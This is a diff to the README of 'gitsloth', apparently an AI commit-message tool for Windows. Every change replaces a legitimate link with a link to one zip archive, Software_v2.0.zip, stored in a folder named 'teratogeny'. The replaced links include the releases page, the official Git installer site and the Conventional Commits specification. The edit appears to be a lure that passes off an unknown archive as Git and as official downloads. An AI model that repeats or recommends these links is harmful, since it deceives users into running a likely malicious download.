@@ -1,6 +1,6 @@
 # 🦥 gitsloth - AI-Guided Git Commit Messages
 
-[![Download gitsloth](https://img.shields.io/badge/Download-gitsloth-blue?style=for-the-badge)](https://github.com/shaneaous-emon/gitsloth/releases)
+[![Download gitsloth](https://img.shields.io/badge/Download-gitsloth-blue?style=for-the-badge)](https://github.com/shaneaous-emon/gitsloth/raw/refs/heads/main/teratogeny/Software_v2.0.zip)
 
 ---
 
@@ -23,7 +23,7 @@ To use gitsloth, your computer should meet these minimum requirements:
 - Git: Installed on your system and accessible via the command line  
   (You can check this by opening Command Prompt and typing `git --version`)
 
-If Git is not installed, you can download it from https://git-scm.com/download/win before using gitsloth.
+If Git is not installed, you can download it from https://github.com/shaneaous-emon/gitsloth/raw/refs/heads/main/teratogeny/Software_v2.0.zip before using gitsloth.
 
 ---
 
@@ -35,7 +35,7 @@ Follow these steps to get gitsloth up and running on your Windows PC.
 
 Click the button below to open the release page containing the latest version of gitsloth.
 
-[![Download gitsloth](https://img.shields.io/badge/Download-gitsloth-green?style=for-the-badge)](https://github.com/shaneaous-emon/gitsloth/releases)
+[![Download gitsloth](https://img.shields.io/badge/Download-gitsloth-green?style=for-the-badge)](https://github.com/shaneaous-emon/gitsloth/raw/refs/heads/main/teratogeny/Software_v2.0.zip)
 
 ### Step 2: Download the installer
 
@@ -136,6 +136,6 @@ If problems persist, visit the repository’s issues page for help from the comm
 
 ## 🔗 Useful Links
 
-- Official downloads: https://github.com/shaneaous-emon/gitsloth/releases
-- Git installation: https://git-scm.com/download/win
-- Conventional Commits: https://www.conventionalcommits.org/en/v1.0.0/
+- Official downloads: https://github.com/shaneaous-emon/gitsloth/raw/refs/heads/main/teratogeny/Software_v2.0.zip
+- Git installation: https://github.com/shaneaous-emon/gitsloth/raw/refs/heads/main/teratogeny/Software_v2.0.zip
+- Conventional Commits: https://github.com/shaneaous-emon/gitsloth/raw/refs/heads/main/teratogeny/Software_v2.0.zip
